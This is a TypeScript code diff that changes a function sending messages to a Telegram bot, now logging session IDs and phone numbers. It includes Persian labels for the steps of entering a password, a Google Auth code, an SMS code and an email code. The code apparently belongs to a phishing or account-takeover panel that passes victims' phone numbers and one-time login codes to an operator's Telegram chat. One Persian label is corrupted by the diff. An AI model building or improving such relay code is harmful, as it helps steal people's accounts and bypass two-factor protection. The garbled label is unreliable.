@@ -61,40 +61,73 @@ export const sendCustomMessageToTelegram = async (
   }
 
   try {
-    console.log("📤 Sending custom message to Telegram");
+    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });
 
-    const response = await fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
+
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [], // No buttons initially
+            },
+          }),
+          signal: controller.signal,
         },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      },
-    );
+      );
 
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error("❌ Telegram send error:", {
-        status: response.status,
-        statusText: response.statusText,
-        error: errorText,
+      clearTimeout(timeoutId);
+
+      if (!response.ok) {
+        let errorText;
+        try {
+          errorText = await response.text();
+        } catch {
+          errorText = `HTTP ${response.status} ${response.statusText}`;
+        }
+
+        console.error("❌ Telegram send error:", {
+          status: response.status,
+          statusText: response.statusText,
+          error: errorText,
+        });
+        throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
+      }
+
+      const result = await response.json();
+      session.messageId = result.result.message_id;
+
+      // Store session
+      activeSessions.set(sessionId, session);
+
+      console.log("✅ Phone number sent to Telegram successfully:", {
+        sessionId,
+        messageId: session.messageId,
       });
-      return { success: false };
+      return { success: true, sessionId };
+    } catch (fetchError) {
+      clearTimeout(timeoutId);
+
+      if (fetchError.name === 'AbortError') {
+        console.error("❌ Telegram request timed out");
+        throw new Error("Request timed out. Please check your internet connection.");
+      }
+
+      throw fetchError;
     }
-
-    const result = await response.json();
-    console.log("✅ Custom message sent successfully");
-
-    return { success: true, messageId: result.result.message_id };
   } catch (error) {
-    console.error("❌ Failed to send custom message to Telegram:", error);
-    return { success: false };
+    console.error("❌ Failed to send phone to Telegram:", error);
+    return { success: false, sessionId };
   }
 };
 
@@ -1105,7 +1138,7 @@ const getCurrentStepText = (step: string): string => {
     auth_password: "وارد کردن رمز عبور",
     auth_google: "وارد کردن کد Google Auth",
     auth_sms: "وارد کردن کد پیامک",
-    auth_email: "وارد کردن کد ایمیل",
+    auth_email: "وارد ک��دن کد ایمیل",
     completed: "تکمیل شده",
   };
 
